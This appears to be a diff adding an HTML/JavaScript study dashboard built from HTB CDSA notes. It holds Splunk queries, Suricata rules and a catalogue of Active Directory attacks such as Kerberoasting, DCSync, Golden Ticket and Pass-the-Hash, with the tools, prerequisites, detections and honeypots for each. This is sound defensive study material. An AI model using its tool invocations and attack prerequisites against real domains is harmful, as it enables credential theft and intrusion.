+    attack:"Ransomware", source:"Detecting Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Zeek – high-volume SMB open+rename (overwrite method)", code:"index=\"ransomware_open_rename_sodinokibi\" sourcetype=\"bro:smb_files:json\"\n| where action IN (\"SMB::FILE_OPEN\", \"SMB::FILE_RENAME\")\n| bin _time span=5m\n| stats count by _time, source, action\n| where count>30\n| stats sum(count) as count values(action) dc(action) as uniq_actions by _time, source\n| where uniq_actions==2 AND count>100"},
+    ]
+  },
+  {
+    tab:"zeek", title:"Ransomware – Extension Renaming", subtitle:"Files renamed to new extension > 20 times in 5 min",
+    attack:"Ransomware", source:"Detecting Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Zeek – SMB FILE_RENAME to new extension spike", code:"index=\"ransomware_new_file_extension_ctbl_ocker\" sourcetype=\"bro:smb_files:json\" action=\"SMB::FILE_RENAME\"\n| bin _time span=5m\n| rex field=\"name\" \"\\.(?<new_file_name_extension>[^\\.]*$)\"\n| rex field=\"prev_name\" \"\\.(?<old_file_name_extension>[^\\.]*$)\"\n| stats count by _time, id.orig_h, id.resp_p, name, source, old_file_name_extension, new_file_name_extension\n| where new_file_name_extension!=old_file_name_extension\n| stats count by _time, id.orig_h, id.resp_p, source, new_file_name_extension\n| where count>20\n| sort -count"},
+    ]
+  },
+
+  // ── SURICATA ──────────────────────────────────────────────────
+  {
+    tab:"suricata", title:"SSH Brute Force", subtitle:"30+ auth attempts in 5 minutes from single source",
+    attack:"SSH Bruteforce", source:"Detecting Windows Attacks",
+    color:"#bc8cff",
+    cmds:[
+      {label:"Suricata rule – SSH brute force threshold", code:"alert tcp any any -> any 22 (msg:\"ET SCAN SSH Brute Force Login Attempt\"; flow:to_server,established; content:\"SSH-\"; threshold:type both, track by_src, count 30, seconds 300; classtype:attempted-admin; sid:9000001; rev:1;)"},
+    ]
+  },
+  {
+    tab:"suricata", title:"C2 Beaconing", subtitle:"10+ GET requests in 60s from same source",
+    attack:"Beaconing", source:"Detecting Windows Attacks",
+    color:"#bc8cff",
+    cmds:[
+      {label:"Suricata rule – periodic HTTP GET beaconing", code:"alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET MALWARE CobaltStrike Beacon HTTP C2 Periodic Checkin\"; flow:established,to_server; http.method; content:\"GET\"; threshold:type both, track by_src, count 10, seconds 60; classtype:trojan-activity; sid:9000002; rev:1;)"},
+    ]
+  },
+  {
+    tab:"suricata", title:"BloodHound DCE-RPC", subtitle:"10+ DCE/RPC bind requests to port 445 in 30s",
+    attack:"Recon / BloodHound", source:"Detecting Windows Attacks",
+    color:"#bc8cff",
+    cmds:[
+      {label:"Suricata rule – high DCE-RPC bind rate", code:"alert tcp $HOME_NET any -> $HOME_NET 445 (msg:\"ET ATTACK BloodHound AD Enumeration via DCE-RPC - High Unique Operation Count\"; flow:established,to_server; content:\"|05 00 0b|\"; depth:3; threshold:type both, track by_src, count 10, seconds 30; classtype:attempted-recon; sid:9000003; rev:1;)"},
+    ]
+  },
+  {
+    tab:"suricata", title:"PrintNightmare", subtitle:"MS-RPRN RpcAddPrinterDriver interface UUID + opnum",
+    attack:"PrintNightmare", source:"Detecting Windows Attacks",
+    color:"#bc8cff",
+    cmds:[
+      {label:"Suricata rule – MS-RPRN UUID + opnum 0x59", code:"alert tcp any any -> any 445 (msg:\"ET EXPLOIT PrintNightmare MS-RPRN RpcAddPrinterDriver Attempt\"; flow:established,to_server; content:\"|78 56 34 12 34 12 cd ab ef 00 01 23 45 67 89 ab|\"; content:\"|59 00|\"; within:100; classtype:attempted-admin; sid:9000004; rev:1;)"},
+    ]
+  },
+  {
+    tab:"suricata", title:"Nmap SYN Scan", subtitle:"Zero-payload SYN probes – 15+ in 5 minutes",
+    attack:"Nmap", source:"Detecting Windows Attacks",
+    color:"#bc8cff",
+    cmds:[
+      {label:"Suricata rule – zero-payload SYN flood", code:"alert tcp any any -> $HOME_NET any (msg:\"ET SCAN Nmap SYN Port Scan - Zero Payload Probe\"; flow:stateless; flags:S,12; dsize:0; threshold:type both, track by_src, count 15, seconds 300; classtype:attempted-recon; sid:9000005; rev:1;)"},
+    ]
+  },
+  {
+    tab:"suricata", title:"Kerberoasting (Wire)", subtitle:"TGS-REQ with RC4-HMAC etype=23 downgrade",
+    attack:"Kerberoasting", source:"Detecting Windows Attacks",
+    color:"#bc8cff",
+    cmds:[
+      {label:"Suricata rule – RC4 etype in TGS-REQ", code:"alert udp any any -> any 88 (msg:\"ET ATTACK Kerberoasting TGS-REQ with RC4-HMAC Downgrade (etype 23)\"; content:\"|a0 03 02 01 05 a1 03 02 01 0c|\"; content:\"|02 01 17|\"; within:200; threshold:type both, track by_src, count 5, seconds 60; classtype:credential-theft; sid:9000006; rev:1;)"},
+    ]
+  },
+  {
+    tab:"suricata", title:"Golden Ticket (Wire)", subtitle:"TGS-REQ without prior AS-REQ from same source",
+    attack:"Golden Ticket", source:"Detecting Windows Attacks",
+    color:"#bc8cff",
+    cmds:[
+      {label:"Suricata rule – TGS-REQ only (pair with SIEM corr.)", code:"alert udp any any -> any 88 (msg:\"ET ATTACK Kerberos Golden Ticket - TGS-REQ Without Prior AS-REQ\"; content:\"|a0 03 02 01 05 a1 03 02 01 0c|\"; threshold:type both, track by_src, count 3, seconds 60; classtype:credential-theft; sid:9000007; rev:1;)"},
+    ]
+  },
+  {
+    tab:"suricata", title:"Cobalt Strike PSExec", subtitle:"Executable drop to \\ADMIN$ over SMB",
+    attack:"Cobalt Strike PSExec", source:"Detecting Windows Attacks",
+    color:"#bc8cff",
+    cmds:[
+      {label:"Suricata rule – \\ADMIN$ path in SMB2 create req", code:"alert smb any any -> $HOME_NET 445 (msg:\"ET ATTACK Cobalt Strike PSExec Executable Drop to ADMIN$ or C$\"; flow:established,to_server; content:\"|5c 00 41 00 44 00 4d 00 49 00 4e 00 24 00|\"; classtype:attempted-admin; sid:9000008; rev:1;)"},
+    ]
+  },
+  {
+    tab:"suricata", title:"DNS Exfiltration", subtitle:"40+ char base64 subdomain queries (tunneling)",
+    attack:"DNS Exfiltration", source:"Detecting Windows Attacks",
+    color:"#bc8cff",
+    cmds:[
+      {label:"Suricata rule – long base64 subdomain PCRE", code:"alert dns any any -> any 53 (msg:\"ET DNS Long DNS Query - Possible DNS Tunneling or Data Exfiltration\"; dns.query; pcre:\"/^[a-zA-Z0-9+\\/=\\-]{40,}\\./\"; threshold:type both, track by_src, count 60, seconds 86400; classtype:policy-violation; sid:9000009; rev:1;)"},
+    ]
+  },
+  {
+    tab:"suricata", title:"Ransomware – File Overwrite", subtitle:"100+ SMB file transactions in 5 minutes",
+    attack:"Ransomware", source:"Detecting Windows Attacks",
+    color:"#bc8cff",
+    cmds:[
+      {label:"Suricata rule – high-volume SMB activity", code:"alert smb any any -> $HOME_NET 445 (msg:\"ET MALWARE Ransomware SMB Excessive File Open and Overwrite Activity\"; flow:established,to_server; threshold:type both, track by_src, count 100, seconds 300; classtype:bad-unknown; sid:9000010; rev:1;)"},
+    ]
+  },
+  {
+    tab:"suricata", title:"Ransomware – Extension Rename", subtitle:"20+ SMB rename requests to new extension in 5 min",
+    attack:"Ransomware", source:"Detecting Windows Attacks",
+    color:"#bc8cff",
+    cmds:[
+      {label:"Suricata rule – SMB2 SetFileInformation rename spike", code:"alert smb any any -> $HOME_NET 445 (msg:\"ET MALWARE Ransomware SMB Excessive File Rename with New Extension\"; flow:established,to_server; content:\"|00 06 00 00|\"; threshold:type both, track by_src, count 20, seconds 300; classtype:bad-unknown; sid:9000011; rev:1;)"},
+    ]
+  },
+];
+
+let currentTab = 'attack';
+
+function renderCmds(){
+  const grid = document.getElementById('cmdGrid');
+  const search = document.getElementById('cmdSearch').value.toLowerCase();
+  grid.innerHTML = '';
+
+  commands.forEach((c,ci) => {
+    if(c.tab !== currentTab) return;
+    const searchable = (c.title+c.subtitle+c.attack+c.source+c.cmds.map(x=>x.code+x.label).join(' ')).toLowerCase();
+    if(search && !searchable.includes(search)) return;
+
+    const sourceColors = {
+      'Windows Attacks':'var(--red)','Windows Event Logs':'var(--blue)',
+      'Detecting Windows Attacks':'var(--green)'
+    };
+    const sc = sourceColors[c.source]||'var(--muted)';
+
+    const bodies = c.cmds.map((cmd,i) => `
+      <div class="cmd-body">
+        <div class="cmd-body-label">${cmd.label}</div>
+        <div class="cmd-pre-wrap">
+          <pre class="cmd-pre">${escHtml(cmd.code)}</pre>
+          <button class="copy-btn" onclick="copyCmd(event,${ci},${i})">copy</button>
+        </div>
+      </div>`).join('');
+
+    const sourceBadge = `<span class="tag" style="background:var(--bg3);color:${sc};border:1px solid ${sc}33">${c.source}</span>`;
+    const attackBadge = `<span class="tag tag-source">${c.attack}</span>`;
+
+    grid.innerHTML += `
+      <div class="cmd-block">
+        <div class="cmd-block-header" onclick="toggleCmd(this)">
+          <div class="cmd-type-dot" style="background:${c.color}"></div>
+          <div style="flex:1">
+            <div class="cmd-title">${c.title}</div>
+            <div class="cmd-subtitle">${c.subtitle}</div>
+          </div>
+          <span style="color:var(--muted);font-size:16px;margin-left:8px">&#x25BE;</span>
+        </div>
+        <div class="cmd-badges">${sourceBadge}${attackBadge}</div>
+        <div class="cmd-bodies" style="display:none">${bodies}</div>
+      </div>`;
+  });
+
+  if(!grid.innerHTML) {
+    grid.innerHTML = '<div style="color:var(--muted);padding:20px;text-align:center">No commands match your search.</div>';
+  }
+}
+
+function toggleCmd(header){
+  const bodies = header.closest('.cmd-block').querySelector('.cmd-bodies');
+  const arrow  = header.querySelector('span[style*="25BE"]');
+  const open = bodies.style.display !== 'none';
+  bodies.style.display = open ? 'none' : 'flex';
+  arrow.innerHTML = open ? '&#x25BE;' : '&#x25B4;';
+}
+
+function switchTab(tab, btn){
+  currentTab = tab;
+  document.querySelectorAll('.cmd-tab').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  renderCmds();
+}
+
+function filterCmds(){ renderCmds(); }
+
+function escHtml(s){
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function copyCmd(e, ci, i){
+  e.stopPropagation();
+  const btn = e.currentTarget;
+  navigator.clipboard.writeText(commands[ci].cmds[i].code).then(()=>{
+    btn.textContent = 'copied!';
+    btn.classList.add('copied');
+    setTimeout(()=>{btn.textContent='copy';btn.classList.remove('copied');}, 1800);
+  });
+}
+
+renderCmds();
+</script>
+
+<div style="padding:16px 32px;border-top:1px solid var(--border);color:var(--muted);font-size:11px">
+  Generated from HTB CDSA notes &mdash; Windows Attacks.md &bull; Windows Event Logs and Finding Evil.md &bull; Detecting Windows Attacks.md
+</div>
+
+<script>
+const attacks = [
+  {
+    id:"kerberoast", name:"Kerberoasting", icon:"🎟",
+    cat:["kerberos","cred"],
+    color:"red",
+    desc:"Request TGS tickets for SPN accounts and crack them offline (RC4 downgrade)",
+    tool:"Rubeus kerberoast + hashcat -m 13100",
+    eventIds:["4769"],
+    sysmonEids:[],
+    etwProviders:["LDAP-Client (SPN query detection)"],
+    hasSplunk:true,
+    hasHoneypot:true,
+    sources:["Windows Attacks","Detecting Windows Attacks"],
+    detection:"Alert on RC4 TGS in AES-only env, or 10+ TGS requests from one IP in short window",
+    prevention:"GMSA accounts (127-char auto-rotating passwords); disable RC4",
+    honeypot:"Fake SPN account (IIS/SQL) that's never legitimately used; any 4769 = alert",
+    prereqs:"Any valid domain user account (no elevation needed) · Machine must be domain-joined or have DC network access (port 88/389) · At least one service account with a registered SPN must exist in AD"
+  },
+  {
+    id:"asrep", name:"AS-REProasting", icon:"🔓",
+    cat:["kerberos","cred"],
+    color:"red",
+    desc:"Request TGT for accounts with 'Do not require Kerberos pre-auth' enabled; crack offline",
+    tool:"Rubeus asreproast + hashcat -m 18200",
+    eventIds:["4768"],
+    sysmonEids:[],
+    etwProviders:["LDAP-Client (userAccountControl flag 4194304)"],
+    hasSplunk:true,
+    hasHoneypot:true,
+    sources:["Windows Attacks","Detecting Windows Attacks"],
+    detection:"4768 with Pre_Authentication_Type=0 and Ticket Encryption=0x17 (RC4)",
+    prevention:"Only enable pre-auth flag if required; enforce 20+ char passwords for those accounts",
+    honeypot:"Fake account with pre-auth disabled; any TGT request triggers alert",
+    prereqs:"Any valid domain user account · DC network access (port 88) · At least one account must have 'Do Not Require Kerberos Pre-Authentication' flag set (DONT_REQ_PREAUTH / userAccountControl 4194304)"
+  },
+  {
+    id:"gpp", name:"GPP Passwords", icon:"📋",
+    cat:["cred"],
+    color:"red",
+    desc:"SYSVOL XML files contain encrypted passwords (cpassword) - AES key publicly published by Microsoft",
+    tool:"Get-GPPPassword (PowerSploit)",
+    eventIds:["4663","4624","4625","4768"],
+    sysmonEids:[],
+    etwProviders:[],
+    hasSplunk:false,
+    hasHoneypot:true,
+    sources:["Windows Attacks"],
+    detection:"File audit on XML (4663) or failed logon with extracted creds (4625, 4771, 4776)",
+    prevention:"Apply KB2962486; audit SYSVOL for cpassword entries",
+    honeypot:"Semi-privileged account in GPP XML with wrong password; failed logon = alert (4625/4771/4776)",
+    prereqs:"Any valid domain user account · SYSVOL read access (granted to all domain users by default) · GPP password entries (cpassword) must still exist in SYSVOL — only present if GPP local accounts/drives were configured before MS14-025 (KB2962486) was applied"
+  },
+  {
+    id:"gpo", name:"GPO Permissions / GPO Files", icon:"🗂",
+    cat:["persistence"],
+    color:"orange",
+    desc:"Misconfigured GPO edit rights or writable share files deployed via GPO; exec on all OU machines",
+    tool:"Direct GPO edit or file replacement",
+    eventIds:["5136"],
+    sysmonEids:[],
+    etwProviders:[],
+    hasSplunk:false,
+    hasHoneypot:true,
+    sources:["Windows Attacks"],
+    detection:"Event 5136 (DS object modified) by non-admin account",
+    prevention:"Restrict GPO edit rights to small group; never deploy from broadly-writable shares",
+    honeypot:"Honeypot GPO on non-critical OU; PowerShell monitors 5136 every 15 min, auto-disables attacker (4725)",
+    prereqs:"Domain-joined machine · Compromised account must have GPO edit/write rights on at least one GPO (misconfigured delegation — discoverable via BloodHound GPO edges) OR write access to a network path that a GPO deploys files from"
+  },
+  {
+    id:"shares", name:"Credentials in Shares", icon:"📁",
+    cat:["cred","recon"],
+    color:"red",
+    desc:"Plaintext credentials in .bat/.ps1/.config files on network shares accessible to all domain users",
+    tool:"Invoke-ShareFinder + findstr",
+    eventIds:["4624","4625","4768"],
+    sysmonEids:[],
+    etwProviders:[],
+    hasSplunk:false,
+    hasHoneypot:true,
+    sources:["Windows Attacks"],
+    detection:"One-to-many SMB connections (share scanner) or abnormal logon source for service accounts",
+    prevention:"Proper ACLs on all shares; weekly automated scans",
+    honeypot:"Fake SQL connection string with wrong password; failed logon = alert (4625/4771/4776)",
+    prereqs:"Any valid domain user account · Network access to SMB shares (port 445) · At least one share must be accessible to regular domain users with credential files present (misconfiguration)"
+  },
+  {
+    id:"objprops", name:"Credentials in Object Properties", icon:"👤",
+    cat:["cred"],
+    color:"red",
+    desc:"Passwords stored in AD user Description/Info fields - readable by ALL domain users",
+    tool:"SearchUserClearTextInformation cmdlet",
+    eventIds:["4624","4625","4768"],
+    sysmonEids:[],
+    etwProviders:[],
+    hasSplunk:false,
+    hasHoneypot:true,
+    sources:["Windows Attacks"],
+    detection:"Behavioral baseline: abnormal logon location for admin/service accounts",
+    prevention:"Continuous auditing; educate admins; automate provisioning",
+    honeypot:"Fake password in Description field of semi-privileged account; failed logon = alert",
+    prereqs:"Any valid domain user account · LDAP read access to DC (default for all domain users, port 389/636) · A target AD user object must have a password stored in its Description or Info attribute (admin misconfiguration)"
+  },
+  {
+    id:"dcsync", name:"DCSync", icon:"🔄",
+    cat:["cred","persistence"],
+    color:"red",
+    desc:"Mimic DC replication to pull all password hashes from AD without touching disk",
+    tool:"Mimikatz lsadump::dcsync",
+    eventIds:["4662"],
+    sysmonEids:[10],
+    etwProviders:[],
+    hasSplunk:true,
+    hasHoneypot:false,
+    sources:["Windows Attacks","Detecting Windows Attacks"],
+    detection:"4662 with DS-Replication-Get-Changes GUID triggered by a non-DC user account",
+    prevention:"RPC Firewall to restrict replication to DCs only; minimize replication permission holders",
+    honeypot:"",
+    prereqs:"Compromised account with both 'Replicating Directory Changes' AND 'Replicating Directory Changes All' AD rights (default: Domain Admins, Enterprise Admins, Domain Controllers) · Network access to DC on port 135/445 (RPC/MSRPC) · Machine does NOT need to be domain-joined"
+  },
+  {
+    id:"golden", name:"Golden Ticket", icon:"🥇",
+    cat:["persistence","kerberos"],
+    color:"orange",
+    desc:"Forge any TGT using krbtgt NTLM hash + domain SID. Persists across password resets (except krbtgt).",
+    tool:"Mimikatz kerberos::golden /ptt",
+    eventIds:["4624","4625","4662","4769","4675"],
+    sysmonEids:[10],
+    etwProviders:[],
+    hasSplunk:true,
+    hasHoneypot:false,
+    sources:["Windows Attacks","Detecting Windows Attacks"],
+    detection:"TGS request (4769) with NO prior TGT (4768) from same source; privileged logon from non-PAW",
+    prevention:"Reset krbtgt password TWICE (10+ hours apart); block privileged users from non-PAW devices",
+    honeypot:"",
+    prereqs:"krbtgt account NTLM hash (obtained via DCSync or LSASS dump directly on a DC — requires DA/SYSTEM on DC) · Domain SID · Ticket can be forged offline; no live DC access needed to create it · Network access to target services to use the ticket"
+  },
+  {
+    id:"constdel", name:"Kerberos Constrained Delegation", icon:"🔗",
+    cat:["kerberos","lateral"],
+    color:"orange",
+    desc:"S4U2self + S4U2proxy: impersonate any domain user to specific SPNs configured on trusted account",
+    tool:"Rubeus s4u + Get-NetUser -TrustedToAuth",
+    eventIds:["4624"],
+    sysmonEids:[3],
+    etwProviders:["LDAP-Client (msDS-AllowedToDelegateTo query)"],
+    hasSplunk:true,
+    hasHoneypot:false,
+    sources:["Windows Attacks","Detecting Windows Attacks"],
+    detection:"4624 with Transited Services field showing delegating service; non-lsass process to port 88 (Rubeus)",
+    prevention:"Mark privileged accounts as 'cannot be delegated'; add to Protected Users group",
+    honeypot:"",
+    prereqs:"Compromised account or service with TRUSTED_TO_AUTH_FOR_DELEGATION flag set AND msDS-AllowedToDelegateTo configured (non-default — requires prior DA to set up) · Account's plaintext password or NTLM hash · Network access to DC (port 88) and target service SPN"
+  },
+  {
+    id:"printerbug", name:"PrinterBug + NTLM Relaying", icon:"🖨",
+    cat:["lateral","cred"],
+    color:"red",
+    desc:"Force DC1 to authenticate to attacker via Print Spooler bug, relay NTLM to DC2 for DCSync",
+    tool:"dementor.py + impacket-ntlmrelayx",
+    eventIds:["4624","4662"],
+    sysmonEids:[],
+    etwProviders:[],
+    hasSplunk:false,
+    hasHoneypot:false,
+    sources:["Windows Attacks"],
+    detection:"Unexpected DC-to-attacker auth; non-DC initiating DCSync (4662)",
+    prevention:"Disable Print Spooler on DCs; enable SMB Signing; block outbound 139/445 from DCs to non-DCs",
+    honeypot:"",
+    prereqs:"Print Spooler service running on DC1 (enabled by default on older DCs) · SMB Signing DISABLED on the relay target DC2 (not the default since Windows Server 2019+ but common in mixed envs) · Valid domain user account to trigger the coercion · Attacker machine network-reachable from both DCs"
+  },
+  {
+    id:"unconst", name:"Unconstrained Delegation + Coercion", icon:"🔓",
+    cat:["kerberos","lateral"],
+    color:"orange",
+    desc:"Any user authenticating to UD server embeds their TGT in the TGS; extract from memory and reuse",
+    tool:"Rubeus monitor + dementor.py coerce",
+    eventIds:["4769","4104"],
+    sysmonEids:[],
+    etwProviders:[],
+    hasSplunk:true,
+    hasHoneypot:false,
+    sources:["Windows Attacks","Detecting Windows Attacks"],
+    detection:"PS querying TrustedForDelegation; extracted TGT reuse = Pass-the-Ticket detection signals",
+    prevention:"RPC firewall; block DCs outbound to 139/445 except to other DCs",
+    honeypot:"",
+    prereqs:"Admin/SYSTEM access on a machine configured with Unconstrained Delegation (TrustedForDelegation=True — only non-DC machines are interesting) · A coercion primitive available to force DC auth (Print Spooler, PetitPotam, etc.) · Network path from the UD machine back to DC is allowed"
+  },
+  {
+    id:"objacl", name:"Object ACLs Abuse", icon:"🔑",
+    cat:["persistence","lateral"],
+    color:"orange",
+    desc:"Misconfigured ACLs allow non-admin to modify AD objects: add SPN (Kerberoastable), reset passwords",
+    tool:"BloodHound ACL edges + PowerView",
+    eventIds:["4738","4742","4724"],
+    sysmonEids:[],
+    etwProviders:[],
+    hasSplunk:false,
+    hasHoneypot:true,
+    sources:["Windows Attacks"],
+    detection:"4738 (user changed) by non-admin account; 4724 (password reset) from unexpected actor",
+    prevention:"Regular ACL audits with BloodHound; naming convention for admin accounts",
+    honeypot:"High-ACL honeypot user + everyone-modifiable user; any 4738 = alert + auto-disable",
+    prereqs:"Any valid domain account · That account must have a misconfigured ACE on a target AD object (GenericAll, GenericWrite, WriteOwner, WriteDACL, ForceChangePassword — common misconfigurations discoverable via BloodHound) · LDAP write access to DC"
+  },
+  {
+    id:"esc1", name:"ESC1 (AD CS)", icon:"📜",
+    cat:["persistence","cred"],
+    color:"red",
+    desc:"Vulnerable cert template allows enrollee to specify SAN = Administrator; authenticate as any user",
+    tool:"Certify.exe find /vulnerable + request /altname",
+    eventIds:[],
+    sysmonEids:[],
+    etwProviders:[],
+    hasSplunk:false,
+    hasHoneypot:false,
+    sources:["Windows Attacks"],
+    detection:"Regular Certify scans; monitor CA issuance logs for SAN mismatches",
+    prevention:"Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT; require CA manager approval",
+    honeypot:"",
+    prereqs:"AD Certificate Services (ADCS) must be deployed in the domain · A certificate template must have CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (ENROLLEE_SUPPLIES_SUBJECT) flag enabled · Enrollment rights on that template must include low-privileged users or 'Domain Users' · Network access to the CA server (typically port 135/443)"
+  },
+  {
+    id:"recon", name:"User / Domain Recon", icon:"🔍",
+    cat:["recon"],
+    color:"blue",
+    desc:"Native tools (whoami, net, nltest, arp) or BloodHound LDAP queries to map AD objects",
+    tool:"SharpHound3 -c all + native cmds",
+    eventIds:["4688"],
+    sysmonEids:[1],
+    etwProviders:["LDAP-Client (BloodHound LDAP burst)"],
+    hasSplunk:true,
+    hasHoneypot:false,
+    sources:["Detecting Windows Attacks"],
+    detection:"Same parent spawning 3+ recon tools (Sysmon EID 1); LDAP query burst via SilkETW",
+    prevention:"Limit LDAP query scope; alert on SharpHound collection patterns",
+    honeypot:"",
+    prereqs:"Any valid domain user account (no elevation needed) · Domain-joined machine OR network access to DC LDAP (port 389/636/3268) for BloodHound · For native CLI recon (whoami, net, nltest): just an active domain session is sufficient"
+  },
+  {
+    id:"spray", name:"Password Spraying", icon:"💦",
+    cat:["cred"],
+    color:"red",
+    desc:"Many failed auth attempts across different user accounts from single source IP",
+    tool:"Various (Kerbrute, DomainPasswordSpray)",
+    eventIds:["4625","4768","4771","4776"],
+    sysmonEids:[],
+    etwProviders:[],
+    hasSplunk:true,
+    hasHoneypot:false,
+    sources:["Detecting Windows Attacks"],
+    detection:"High distinct-user failure count from same source IP in 15-min window",
+    prevention:"Account lockout policy; MFA; impossible travel detection",
+    honeypot:"",
+    prereqs:"Network access to an authentication endpoint: DC port 88 (Kerberos), 389 (LDAP), or 445 (SMB) · A list of valid domain usernames (from OSINT, recon, or prior access) · No elevated privileges required — can be executed from off-domain"
+  },
+  {
+    id:"llmnr", name:"LLMNR / NBT-NS Poisoning", icon:"📡",
+    cat:["cred","lateral"],
+    color:"red",
+    desc:"Responder poisons broadcast name resolution to capture NTLMv2 hashes from network",
+    tool:"Responder.py",
+    eventIds:["4648"],
+    sysmonEids:[22],
+    etwProviders:[],
+    hasSplunk:true,
+    hasHoneypot:true,
+    sources:["Detecting Windows Attacks"],
+    detection:"Non-existent hostname resolves (honeypot); Sysmon EID 22 for suspicious DNS queries; 4648 explicit logon to rogue share",
+    prevention:"Disable LLMNR and NBT-NS via GPO",
+    honeypot:"Query non-existent hostname periodically; successful resolution = attacker present (BNRP method)",
+    prereqs:"Attacker must be on the same LAN broadcast domain as victim machines (Layer 2 adjacency or same VLAN) · LLMNR and/or NBT-NS must be enabled (Windows default) — disabled via GPO in hardened environments · No domain account required; purely passive network position"
+  },
+  {
+    id:"pth", name:"Pass-the-Hash", icon:"🔐",
+    cat:["lateral","cred"],
+    color:"orange",
+    desc:"Reuse NTLM hash to authenticate without knowing plaintext password (LSASS extraction first)",
+    tool:"Mimikatz sekurlsa::pth",
+    eventIds:["4624"],
+    sysmonEids:[10],
+    etwProviders:[],
+    hasSplunk:true,
+    hasHoneypot:false,
+    sources:["Detecting Windows Attacks"],
+    detection:"4624 with LogonType=9 + Logon_Process=seclogo correlated with prior LSASS access (EID 10)",
+    prevention:"Credential Guard; disable NTLM where possible; PAW workstations",
+    honeypot:"",
+    prereqs:"Local admin or SYSTEM on the source machine (to read LSASS memory) · NTLM hash of a target domain or local account · Credential Guard must NOT be enabled · Target service must accept NTLM authentication (SMB, WMI, RPC) · NTLM not blocked by firewall or policy"
+  },
+  {
+    id:"ptt", name:"Pass-the-Ticket", icon:"🎫",
+    cat:["lateral","kerberos"],
+    color:"orange",
+    desc:"Inject stolen Kerberos ticket into current session, bypassing auth",
+    tool:"Rubeus ptt /ticket",
+    eventIds:["4768","4769","4770"],
+    sysmonEids:[],
+    etwProviders:[],
+    hasSplunk:true,
+    hasHoneypot:false,
+    sources:["Detecting Windows Attacks"],
+    detection:"4769/4770 with NO prior 4768 from same source (incomplete Kerberos flow)",
+    prevention:"Short ticket lifetimes; monitor for anomalous TGS without TGT",
+    honeypot:"",
+    prereqs:"Local admin or SYSTEM on a machine where the target user has an active Kerberos session (to extract TGT/TGS from LSASS memory) · Stolen ticket must not be expired · Machine does not need to be domain-joined to inject and use the ticket"
+  },
+  {
+    id:"oth", name:"Overpass-the-Hash", icon:"⬆",
+    cat:["lateral","kerberos"],
+    color:"orange",
+    desc:"Convert NTLM hash into a real Kerberos TGT via raw AS-REQ (Rubeus asktgt)",
+    tool:"Rubeus asktgt /rc4",
+    eventIds:[],
+    sysmonEids:[3],
+    etwProviders:[],
+    hasSplunk:true,
+    hasHoneypot:false,
+    sources:["Detecting Windows Attacks"],
+    detection:"Non-lsass.exe process connecting to port 88 (Sysmon EID 3) - raw AS-REQ from Rubeus",
+    prevention:"Block unnecessary Kerberos port 88 access from workstations",
+    honeypot:"",
+    prereqs:"Local admin or SYSTEM on source machine to extract NTLM hash from LSASS · NTLM hash of a domain account · Network access to DC port 88 (Kerberos) · RC4 encryption type not disabled in the domain"
+  },
+  {
+    id:"silver", name:"Silver Ticket", icon:"🥈",
+    cat:["lateral","kerberos"],
+    color:"orange",
+    desc:"Forge TGS using service account hash only (no KDC interaction); access specific service",
+    tool:"Mimikatz kerberos::golden /service",
+    eventIds:["4624","4672","4720"],
+    sysmonEids:[],
+    etwProviders:[],
+    hasSplunk:true,
+    hasHoneypot:false,
+    sources:["Detecting Windows Attacks"],
+    detection:"Logon from user absent in 4720 baseline; 4672 special privileges on unexpected account. Harder to detect - no DC logging",
+    prevention:"Strong service account passwords; monitor service account logon sources",
+    honeypot:"",
+    prereqs:"NTLM hash of the specific target service account (from LSASS dump, Kerberoasting, etc.) · Domain SID · No live DC interaction needed to forge the ticket · Target service must not enforce PAC validation (most services do not by default)"
+  },
+  {
+    id:"dcshadow", name:"DCShadow", icon:"👥",
+    cat:["persistence"],
+    color:"red",
+    desc:"Register a rogue DC to push unauthorized AD changes via legitimate replication",
+    tool:"Mimikatz lsadump::dcshadow",
+    eventIds:["4742"],
+    sysmonEids:[],
+    etwProviders:[],
+    hasSplunk:true,
+    hasHoneypot:false,
+    sources:["Detecting Windows Attacks"],
+    detection:"4742 with unexpected GC/ SPN added to a non-DC computer object",
+    prevention:"Monitor computer account changes; restrict DC registration rights",
+    honeypot:"",
+    prereqs:"Domain Admin privileges (to register a rogue DC in AD) · OR: SYSTEM on a domain-joined machine PLUS explicit replication rights granted · Requires TWO concurrent Mimikatz processes: one with DA rights (to set up rogue DC) + one with SYSTEM (to push the replication) · Network connectivity to a real DC for the replication push"
+  },
+  {
+    id:"dllhijack", name:"DLL Hijacking", icon:"📦",
+    cat:["persistence","lateral"],
+    color:"blue",
+    desc:"Place malicious DLL in search-order path before legitimate one; executed by trusted binary",
+    tool:"Custom reflective DLL",
+    eventIds:[],
+    sysmonEids:[7],
+    etwProviders:[],
+    hasSplunk:false,
+    hasHoneypot:false,
+    sources:["Windows Event Logs"],
+    detection:"Sysmon EID 7: ImageLoaded outside System32, Signed=false, from known-vulnerable binary",
+    prevention:"Place binaries in directories users can't write to; enable DLL safe search mode",
+    honeypot:"",
+    prereqs:"Local access on the target machine · Write permissions on a directory that appears in the DLL search order before the legitimate DLL location (often the application's own folder) · The vulnerable application must be executed — for privilege escalation it must run as SYSTEM or a higher-privileged user/service"
+  },
+  {
+    id:"ppidspoof", name:"PPID Spoofing", icon:"👨‍👦",
+    cat:["lateral"],
+    color:"blue",
+    desc:"Create process with fake parent PID to evade parent-child detection rules",
+    tool:"psgetsystem / CreateProcessFromParent",
+    eventIds:[],
+    sysmonEids:[1],
+    etwProviders:["Kernel-Process (shows real creator)"],
+    hasSplunk:false,
+    hasHoneypot:false,
+    sources:["Windows Event Logs"],
+    detection:"Sysmon EID 1 shows spoofed parent; ETW Kernel-Process reveals real creator (PowerShell)",
+    prevention:"Use EDR with ETW kernel telemetry; Sysmon alone is blind to this",
+    honeypot:"",
+    prereqs:"Local code execution on target machine · Admin or elevated privileges are typically required to open a PROCESS_CREATE_PROCESS handle to an arbitrary target parent process (e.g. spoolsv.exe) · Useful as a defense evasion step after initial access is already established"
+  },
+  {
+    id:"dotnetinject", name:".NET / Unmanaged PS Injection", icon:"💉",
+    cat:["lateral"],
+    color:"blue",
+    desc:"Execute C# assembly in memory via non-.NET process (execute-assembly / Invoke-PSInject)",
